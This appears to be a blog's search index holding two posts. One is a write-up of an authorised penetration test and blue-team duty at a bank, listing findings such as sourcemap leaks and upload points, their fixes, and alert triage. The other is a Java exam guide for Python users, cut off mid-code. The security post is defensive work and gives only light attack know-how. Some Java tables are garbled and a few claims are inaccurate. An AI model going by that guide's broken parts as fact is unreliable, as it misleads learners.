<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024国家护网</title>
    <link href="/2025/07/30/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/"/>
    <url>/2025/07/30/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="前言部分"><a href="#前言部分" class="headerlink" title="前言部分"></a>前言部分</h1><h2 id="0-项目背景与目标"><a href="#0-项目背景与目标" class="headerlink" title="0.项目背景与目标"></a>0.项目背景与目标</h2><p>2024国护开始，在北京奇安信，国家xx银行驻场。护网前先是进行了渗透测试，这篇blog进行详细的叙述。</p><h3 id="郑重说明"><a href="#郑重说明" class="headerlink" title="郑重说明"></a>郑重说明</h3><p>本次测试为完全授权的合法合规测试。<br>文中涉及目标均为”某银行”代称，严格脱敏。<br>不会透露内部数据信息，目的在于分享方法论，过程，共性问题与防护思路。</p><h1 id="测试过程及方法论"><a href="#测试过程及方法论" class="headerlink" title="测试过程及方法论"></a>测试过程及方法论</h1><h2 id="1-漏洞扫描结果"><a href="#1-漏洞扫描结果" class="headerlink" title="1.漏洞扫描结果"></a>1.漏洞扫描结果</h2><p>包括但不限于应用漏洞，系统漏洞以及弱口令等常见安全隐患。本次共发现漏洞77个：高危漏洞0个，中危漏洞8个，低危漏洞69个。研判后确定存在高危0个，中危5个</p><h2 id="2-漏洞类型"><a href="#2-漏洞类型" class="headerlink" title="2.漏洞类型"></a>2.漏洞类型</h2><ul><li>Access-Control_Allow-Origin设置不当－低危</li><li>Cookie未开启HttpOnly－低危</li><li>Cookie未开启Secure－低危</li><li>Host头欺骗攻击－中危</li><li>Webpack Sourcemap文件泄露漏洞－低危</li><li>常见管理接口(正常登录界面)－中危</li><li>密码表单传输未加密－中危</li><li>疑似文件上传点－低危</li><li>发现Robots.txt－低危</li></ul><h2 id="关于“Host头欺骗攻击”漏洞"><a href="#关于“Host头欺骗攻击”漏洞" class="headerlink" title="关于“Host头欺骗攻击”漏洞"></a>关于“Host头欺骗攻击”漏洞</h2><ol><li>漏洞描述:<br>开发人员为方便获取网站域名，常依赖HTTP协议的Host头，如在php代码中可用$_SERVER[“HTTP_HOST”]获取。但实际中该头由客户端控制，不可信，若应用程序未正确处理，可能导致恶意代码传入。</li><li>修复建议:<br>不处理客户端传入的Host头信息，或者使用前进行白名单检查。</li></ol><h2 id="关于“Webpack-Sourcemap文件泄露”漏洞"><a href="#关于“Webpack-Sourcemap文件泄露”漏洞" class="headerlink" title="关于“Webpack Sourcemap文件泄露”漏洞"></a>关于“Webpack Sourcemap文件泄露”漏洞</h2><ol><li>漏洞背景</li></ol><ul><li>Webpack：是前端常用的打包工具，能把一堆零散的前端代码（像 Vue 写的组件、JS 逻辑等）打包成几个文件，方便网站运行 。</li><li>Sourcemap：就像“代码地图”，原本打包后代码会被压缩、混淆，有了它，出问题时能顺着“地图”找到原始代码位置，方便开发调试 。但要是泄露出去，就会把原始代码暴露给外人 。</li></ul><ol start="2"><li>漏洞情况<br>因为网站用 Webpack 打包时，配置没弄好，导致.js.map这类Sourcemap文件能被外人通过网络请求拿到 。一旦被拿到，里面可能藏着：</li></ol><ul><li>API 信息：比如系统里调用哪些后台接口，知道了可能仿造请求搞破坏 。</li><li>加密算法</li><li>管理员邮箱：知道了可能给管理员发钓鱼邮件，骗他们泄露更重要的账号密码 。</li><li>内部功能<br>GET &#x2F;coremail&#x2F;bundle&#x2F;polyfill.e5a03.js HTTP&#x2F;1.1这类请求，就是在尝试找能拿到Sourcemap文件的入口。</li></ul><ol start="3"><li>修复</li></ol><ul><li>改配置：找到项目里config&#x2F;index.js文件，把productionSourceMap改成  false  。这样正式环境（用户访问的环境）就不会生成 Sourcemap 文件，从源头减少泄露可能 。</li><li>删文件：把正式环境里已经存在的.js.map文件都删掉或者设置成不让外人访问 。这样就算之前有残留，也不会被拿到了 。<br>简单说，就是网站因为前端打包配置问题，暴露了能让别人拿到原始代码、敏感信息的“地图文件”，按修复建议改配置、删文件，就能堵住这个安全窟窿。</li></ul><h2 id="关于“疑似文件上传”漏洞"><a href="#关于“疑似文件上传”漏洞" class="headerlink" title="关于“疑似文件上传”漏洞"></a>关于“疑似文件上传”漏洞</h2><ol><li><p>漏洞描述：<br>检测到应用表单&#x2F;脚本里有文件上传表单或代码，存在文件上传点。若 Web 应用处理文件上传时，路径、文件名、扩展名可被用户控制，攻击者可能上传脚本木马，控制服务器</p></li><li><p>请求包：<br>包含  GET &#x2F;coremail&#x2F;bundle&#x2F;e5a03.js HTTP&#x2F;1.1  等请求头（Host、Accept - Encoding 等 ）</p></li><li><p>输出研判：<br>发现  <input type="file" name="upfilg" class="uploadfile" size="1" accept="{}" multiple="true" />  上传控件</p></li><li><p>修复建议：<br>检查上传文件扩展名白名单；上传路径、文件名不用用户可控数据；上传目录不提供脚本解析；图片上传先处理（转码、缩略、水印等 ）再保存 ，以此防范文件上传漏洞带来的服务器被入侵风险 。</p></li></ol><h1 id="利用waf检测"><a href="#利用waf检测" class="headerlink" title="利用waf检测"></a>利用waf检测</h1><p>尝试用命令注入攻击<br><img src="/images/2024%E5%9B%BD%E6%8A%A41.jpg"></p><p><img src="/images/2024%E5%9B%BD%E6%8A%A42.jpg"></p><p><img src="/images/2024%E5%9B%BD%E6%8A%A43.jpg"></p><h1 id="蓝队实战"><a href="#蓝队实战" class="headerlink" title="蓝队实战"></a>蓝队实战</h1><p><img src="/images/2024%E5%9B%BD%E6%8A%A44.jpg"></p><ul><li>确认威胁详情：查看每个威胁名称，了解其具体含义，如  TCP_Kerberos_横向移动_横向工具转移，涉及到 Kerberos 协议的横向移动风险，明确攻击者可能的意图和攻击方式 。</li><li>查看威胁级别：区分高、中、低危告警，优先处理像  HTTP_文件操作攻击_SiteServer  这类高危告警，因为它们对系统安全的威胁更大。</li></ul><ol><li>直接在防火墙，路由器封ip</li><li>看被攻击的目的ip(服务器)，临时加强防御</li><li>看日志，找是否是内网电脑中病毒</li><li>针对nmap，把不常用的端口关闭，更新，打补丁</li><li>文件上传限制文件内容，如过滤php等</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA</title>
    <link href="/2025/06/21/JAVA/"/>
    <url>/2025/06/21/JAVA/</url>
    
    <content type="html"><![CDATA[<p>以下是为<strong>Java零基础但精通Python算法</strong>的学习者量身定制的超详细考点解析，结合Python对比帮你快速理解Java核心概念：</p><hr><h3 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a><strong>第一章 绪论</strong></h3><h4 id="核心考点"><a href="#核心考点" class="headerlink" title="核心考点"></a><strong>核心考点</strong></h4><ol><li><p><strong>Java语言特点</strong>（单选题&#x2F;简答题）</p><ul><li><strong>跨平台性</strong>（JVM实现）：<code>.java</code> → 编译为 <code>.class</code>字节码 → JVM解释执行（对比Python的<code>.py</code>→PVM）</li><li><strong>面向对象</strong>：完全OOP（连<code>main</code>都必须在类中），Python支持多范式</li><li><strong>自动内存管理</strong>：垃圾回收器GC（类似Python，但Java需手动触发<code>System.gc()</code>建议回收）</li><li><strong>强类型</strong>：变量必须声明类型（Python是动态类型）</li></ul></li><li><p><strong>Java运行原理</strong>（填空题）</p><pre><code class=" mermaid">graph LRA[.java源码] --&gt; B[javac编译]B --&gt; C[.class字节码]C --&gt; D[JVM加载]D --&gt; E[解释执行/即时编译JIT]</code></pre></li></ol><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="Java运行原理（外卖平台类比）"><a href="#Java运行原理（外卖平台类比）" class="headerlink" title="Java运行原理（外卖平台类比）"></a><strong>Java运行原理（外卖平台类比）</strong></h3><ol><li><strong>您写代码</strong> &#x3D; 在美团后台创建新功能（<code>.java</code>文件）</li><li><strong>javac编译</strong> &#x3D; 美团技术团队打包成APP安装包（生成<code>.class</code>）</li><li><strong>JVM运行</strong> &#x3D; 用户手机安装美团APP（不同手机&#x3D;不同操作系统）</li><li><strong>跨平台</strong> &#x3D; 同一安装包在华为&#x2F;小米&#x2F;iPhone都能运行</li></ol><p>“Java要求所有代码必须包含在类中（包括main入口函数），通过创建对象来操作数据和方法。这符合面向对象的封装性（数据与操作绑定在类内）、继承性（extends实现代码复用）、多态性（父类引用指向子类对象）三大特征”</p><h3 id="第二章-Java语言基础"><a href="#第二章-Java语言基础" class="headerlink" title="第二章 Java语言基础"></a><strong>第二章 Java语言基础</strong></h3><h4 id="1-标识符规则（判断题）"><a href="#1-标识符规则（判断题）" class="headerlink" title="1. 标识符规则（判断题）"></a><strong>1. 标识符规则</strong>（判断题）</h4><ul><li>首字符：字母&#x2F;<code>_</code>&#x2F;<code>$</code>（<strong>不能数字开头</strong>，同Python）</li><li>区分大小写（<code>age</code>≠<code>Age</code>）</li><li><strong>禁止关键字</strong>（<code>int</code>, <code>class</code>等48个保留字）<blockquote><p>✅合法：<code>_name</code>, <code>$value</code><br>❌非法：<code>1var</code>（数字开头）, <code>public</code>（关键字）</p></blockquote></li></ul><h4 id="2-数据类型（填空题）"><a href="#2-数据类型（填空题）" class="headerlink" title="2. 数据类型（填空题）"></a><strong>2. 数据类型</strong>（填空题）</h4><table><thead><tr><th>类型</th><th>位数</th><th>范围</th><th>Java示例</th><th>Python对比</th></tr></thead><tbody><tr><td><code>byte</code></td><td>8</td><td>-128~127</td><td><code>byte b = 10;</code></td><td><code>int</code>自动处理</td></tr><tr><td><code>int</code></td><td>32</td><td>≈±21亿</td><td><code>int i = 100;</code></td><td><code>int</code>无位数限制</td></tr><tr><td><code>double</code></td><td>64</td><td>IEEE 754浮点</td><td><code>double d=3.14;</code></td><td><code>float</code></td></tr><tr><td><code>char</code></td><td>16</td><td>Unicode字符</td><td><code>char c=&#39;A&#39;;</code></td><td><code>str</code>单字符</td></tr><tr><td><code>boolean</code></td><td>-</td><td><code>true</code>&#x2F;<code>false</code></td><td><code>boolean flag=true;</code></td><td><code>bool</code></td></tr></tbody></table><p><strong>引用类型</strong>：类&#x2F;数组&#x2F;接口（类似Python的类实例、list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 引用类型声明</span><br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">// 数组声明（固定长度）</span><br></code></pre></td></tr></table></figure><h4 id="3-运算符（程序填空）"><a href="#3-运算符（程序填空）" class="headerlink" title="3. 运算符（程序填空）"></a><strong>3. 运算符</strong>（程序填空）</h4><table><thead><tr><th>类型</th><th>运算符</th><th>特殊点</th></tr></thead><tbody><tr><td>算术</td><td><code>+ - * / %</code></td><td><code>10/3=3</code>（整数除）</td></tr><tr><td>关系</td><td><code>== != &gt; &lt;</code></td><td><strong><code>==</code>比较引用地址</strong>（字符串用<code>.equals()</code>）</td></tr><tr><td>逻辑</td><td>&#96;&amp;&amp;</td><td></td></tr><tr><td>赋值</td><td><code>= += -=</code></td><td><code>x += 5</code> 等价 <code>x = x+5</code></td></tr></tbody></table><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="Java运算符考试详解（针对Python开发者）"><a href="#Java运算符考试详解（针对Python开发者）" class="headerlink" title="Java运算符考试详解（针对Python开发者）"></a><em>Java运算符考试详解（针对Python开发者）</em></h1><p><em>下面我将详细讲解Java运算符在考试中的具体考法，结合真题和Python对比，帮助您彻底掌握这些考点：</em></p><h2 id="一、算术运算符：整数除法的”陷阱题”"><a href="#一、算术运算符：整数除法的”陷阱题”" class="headerlink" title="一、算术运算符：整数除法的”陷阱题”"></a><em>一、算术运算符：整数除法的”陷阱题”</em></h2><h3 id="考试常见题型"><a href="#考试常见题型" class="headerlink" title="考试常见题型"></a><em>考试常见题型</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a / b; <span class="hljs-comment">// 空1：c = ______ (3.0)</span><br><span class="hljs-type">double</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)a / b; <span class="hljs-comment">// 空2：d = ______ (3.333...)</span><br><br><span class="hljs-comment">// 题型2：判断题</span><br><span class="hljs-comment">// &quot;Java中5/2的结果是2.5&quot; → False（正确答案是2）</span><br></code></pre></td></tr></table></figure><h3 id="核心考点解析"><a href="#核心考点解析" class="headerlink" title="核心考点解析"></a><em>核心考点解析</em></h3><ol><li><p><em><strong>整数除法截断</strong>：</em></p><ul><li><em>Java：<code>10/3 = 3</code>（直接舍弃小数部分）</em></li><li><em>Python：<code>10/3 = 3.333...</code>（自动转为浮点除）</em></li></ul></li><li><p><em><strong>类型提升规则</strong>：</em></p><pre><code class=" mermaid">graph LRA[int/int] --&gt; B[int]C[double/int] --&gt; D[double]D --&gt; E[保留小数]</code></pre></li></ol><h3 id="避坑技巧"><a href="#避坑技巧" class="headerlink" title="避坑技巧"></a><em>避坑技巧</em></h3><ul><li><em>看到除法先看操作数类型</em></li><li><em>需要小数结果时，将被除数强转为<code>double</code></em></li><li><em>取模运算<code>%</code>的行为与Python相同</em></li></ul><h2 id="二、关系运算符：字符串比较的”死亡陷阱”"><a href="#二、关系运算符：字符串比较的”死亡陷阱”" class="headerlink" title="二、关系运算符：字符串比较的”死亡陷阱”"></a><em>二、关系运算符：字符串比较的”死亡陷阱”</em></h2><h3 id="考试高频题"><a href="#考试高频题" class="headerlink" title="考试高频题"></a><em>考试高频题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序输出判断</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br><br>System.out.println(s1 == s2); <span class="hljs-comment">// 空1：输出______ (false)</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// 空2：输出______ (true)</span><br><br><span class="hljs-comment">// 题型2：找错题</span><br><span class="hljs-comment">// 找出下面代码的错误：</span><br><span class="hljs-keyword">if</span> (nameInput == <span class="hljs-string">&quot;admin&quot;</span>) &#123; <span class="hljs-comment">// 应该用equals</span><br>    grantAccess();<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th><em>比较方式</em></th><th><em>Java</em></th><th><em>Python</em></th></tr></thead><tbody><tr><td><em>值比较</em></td><td><em><code>.equals()</code></em></td><td><em><code>==</code></em></td></tr><tr><td><em>引用比较</em></td><td><em><code>==</code></em></td><td><em><code>is</code></em></td></tr></tbody></table><blockquote><p><em>💡 考试口诀：<strong>Java字符串，equals保平安</strong></em></p></blockquote><h2 id="三、逻辑运算符：短路规则的”隐蔽考点”"><a href="#三、逻辑运算符：短路规则的”隐蔽考点”" class="headerlink" title="三、逻辑运算符：短路规则的”隐蔽考点”"></a><em>三、逻辑运算符：短路规则的”隐蔽考点”</em></h2><h3 id="典型考题"><a href="#典型考题" class="headerlink" title="典型考题"></a><em>典型考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：程序填空</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">10</span>) &amp;&amp; (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空1：x的值是？______ (5)</span><br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (x &lt; <span class="hljs-number">10</span>) || (++x &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 空2：x的值是？______ (5)</span><br><br><span class="hljs-comment">// 题型2：输出结果分析</span><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">4</span> || a++ &lt; <span class="hljs-number">10</span>) &#123;<br>    System.out.println(a); <span class="hljs-comment">// 输出？______ (5)</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="短路规则详解"><a href="#短路规则详解" class="headerlink" title="短路规则详解"></a><em>短路规则详解</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>执行情况</em></th><th><em>解释</em></th></tr></thead><tbody><tr><td><em><code>false &amp;&amp; ...</code></em></td><td><em>跳过右边</em></td><td><em>一假即假</em></td></tr><tr><td>*&#96;true</td><td></td><td>…&#96;*</td></tr><tr><td><em><code>true &amp;&amp; ...</code></em></td><td><em>执行右边</em></td><td><em>需验证</em></td></tr><tr><td>*&#96;false</td><td></td><td>…&#96;*</td></tr></tbody></table><h2 id="四、赋值运算符：类型转换的”暗坑”"><a href="#四、赋值运算符：类型转换的”暗坑”" class="headerlink" title="四、赋值运算符：类型转换的”暗坑”"></a><em>四、赋值运算符：类型转换的”暗坑”</em></h2><h3 id="经典考题"><a href="#经典考题" class="headerlink" title="经典考题"></a><em>经典考题</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 题型1：编译错误判断</span><br><span class="hljs-type">byte</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>num = num + <span class="hljs-number">5</span>;   <span class="hljs-comment">// 空1：是否编译错误？______ (是)</span><br>num += <span class="hljs-number">5</span>;        <span class="hljs-comment">// 空2：是否编译错误？______ (否)</span><br><br><span class="hljs-comment">// 题型2：结果计算</span><br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>x += <span class="hljs-number">3</span> * <span class="hljs-number">2</span>;      <span class="hljs-comment">// 空3：x = ______ (11)</span><br></code></pre></td></tr></table></figure><h3 id="类型转换规则"><a href="#类型转换规则" class="headerlink" title="类型转换规则"></a><em>类型转换规则</em></h3><pre><code class=" mermaid">graph LR    A[byte + int] --&gt; B[int]    C[直接赋值给byte] --&gt; D[需要强制转换]    E[复合赋值] --&gt; F[自动转换]</code></pre><h3 id="复合赋值等价公式"><a href="#复合赋值等价公式" class="headerlink" title="复合赋值等价公式"></a><em>复合赋值等价公式</em></h3><table><thead><tr><th><em>表达式</em></th><th><em>等价形式</em></th><th><em>特殊处理</em></th></tr></thead><tbody><tr><td><em><code>x += y</code></em></td><td><em><code>x = (T)(x + y)</code></em></td><td><em>自动类型转换</em></td></tr><tr><td><em><code>x = x + y</code></em></td><td><em>-</em></td><td><em>需要手动转换</em></td></tr></tbody></table><h2 id="五、综合考题分析"><a href="#五、综合考题分析" class="headerlink" title="五、综合考题分析"></a><em>五、综合考题分析</em></h2><h3 id="真题示例（程序填空）"><a href="#真题示例（程序填空）" class="headerlink" title="真题示例（程序填空）"></a><em>真题示例（程序填空）</em></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 算术运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>, n = <span class="hljs-number">4</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> m / n;          <span class="hljs-comment">// 空1：______ (1.0)</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>)m / n;  <span class="hljs-comment">// 空2：______ (1.75)</span><br>        <br>        <span class="hljs-comment">// 关系运算符</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Java&quot;</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> s1.equals(s2); <span class="hljs-comment">// 空3：______ (false)</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> s1.equalsIgnoreCase(s2); <span class="hljs-comment">// 空4：______ (true)</span><br>        <br>        <span class="hljs-comment">// 逻辑运算符</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> (x &gt; <span class="hljs-number">3</span>) &amp;&amp; (x++ &lt; <span class="hljs-number">10</span>); <span class="hljs-comment">// 空5：b3 = ______ (true)</span><br>        <span class="hljs-comment">// 空6：x = ______ (6)</span><br>        <br>        <span class="hljs-comment">// 赋值运算符</span><br>        <span class="hljs-type">byte</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        y += <span class="hljs-number">20</span>; <span class="hljs-comment">// 空7：y = ______ (30)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解题技巧"><a href="#解题技巧" class="headerlink" title="解题技巧"></a><em>解题技巧</em></h3><ol><li><em><strong>整数除法</strong>：先看操作数类型，整数除结果必为整数</em></li><li><em><strong>字符串比较</strong>：永远用equals，&#x3D;&#x3D;只用于基本类型</em></li><li><em><strong>短路规则</strong>：注意自增(++)在逻辑表达式中的执行情况</em></li><li><em><strong>复合赋值</strong>：注意自动类型转换特性</em></li></ol><h2 id="六、Python开发者特别注意事项"><a href="#六、Python开发者特别注意事项" class="headerlink" title="六、Python开发者特别注意事项"></a><em>六、Python开发者特别注意事项</em></h2><table><thead><tr><th><em>运算符</em></th><th><em>Java陷阱</em></th><th><em>Python行为</em></th><th><em>应对策略</em></th></tr></thead><tbody><tr><td><em><code>/</code></em></td><td><em>整数除截断</em></td><td><em>自动浮点除</em></td><td><em>强转为double</em></td></tr><tr><td><em><code>==</code></em></td><td><em>比较对象引用</em></td><td><em>比较值</em></td><td><em>字符串用equals</em></td></tr><tr><td><em><code>&amp;&amp;</code></em></td><td><em>短路规则</em></td><td><em>and同样短路</em></td><td><em>避免右边有副作用</em></td></tr><tr><td><em><code>+=</code></em></td><td><em>自动类型转换</em></td><td><em>无类型限制</em></td><td><em>注意byte&#x2F;short类型</em></td></tr><tr><td><em><code>++</code></em></td><td><em>前后缀区别大</em></td><td><em>无此运算符</em></td><td><em>避免在复杂表达式使用</em></td></tr></tbody></table><h2 id="七、考试答题口诀"><a href="#七、考试答题口诀" class="headerlink" title="七、考试答题口诀"></a><em>七、考试答题口诀</em></h2><blockquote><p><em>除法先看类型，整数结果截断<br></em><br><em>字符串比用equals，&#x3D;&#x3D;只判血缘<br></em><br><em>逻辑运算会短路，右边可能不算<br></em><br><em>复合赋值能强转，普通赋值瞪眼<br></em><br><em>自增前后要分清，考试专设此险</em></p></blockquote><p><em>掌握这些考点和技巧，运算符相关题目将不再是难题！考试时遇到运算符题目，先默念口诀再作答，能有效避免常见陷阱。</em></p><h4 id="4-控制语句（与Python对比）"><a href="#4-控制语句（与Python对比）" class="headerlink" title="4. 控制语句（与Python对比）"></a><strong>4. 控制语句</strong>（与Python对比）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// if-else（必须用括号）</span><br><span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) &#123;<br>    System.out.println(<span class="hljs-string">&quot;及格&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;不及格&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// switch（支持int/char/String）</span><br><span class="hljs-keyword">switch</span>(grade) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>: <br>        System.out.println(<span class="hljs-string">&quot;优秀&quot;</span>);<br>        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 必须break，否则穿透！</span><br>    <span class="hljs-keyword">default</span>:<br>        System.out.println(<span class="hljs-string">&quot;未知&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-循环（重点！程序填空高频）"><a href="#5-循环（重点！程序填空高频）" class="headerlink" title="5. 循环（重点！程序填空高频）"></a><strong>5. 循环</strong>（重点！程序填空高频）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// for循环（固定次数）</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;  <span class="hljs-comment">// i只在循环内有效</span><br>    System.out.print(i);<br>&#125;<br><br><span class="hljs-comment">// while（条件循环）</span><br><span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (j&lt;<span class="hljs-number">5</span>) &#123;<br>    System.out.print(j);<br>    j++;<br>&#125;<br><br><span class="hljs-comment">// do-while（至少执行一次）</span><br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span> &#123;<br>    System.out.print(k);<br>    k++;<br>&#125; <span class="hljs-keyword">while</span> (k&lt;<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><h4 id="6-break-continue（判断题）"><a href="#6-break-continue（判断题）" class="headerlink" title="6. break&#x2F;continue（判断题）"></a><strong>6. break&#x2F;continue</strong>（判断题）</h4><ul><li><code>break</code>：跳出<strong>整个循环</strong>（同Python）</li><li><code>continue</code>：跳过<strong>本次循环</strong>剩余代码（同Python）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;     <span class="hljs-comment">// 结束循环（i=5时退出）</span><br>    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// 跳过偶数</span><br>    System.out.print(i);  <span class="hljs-comment">// 输出：1 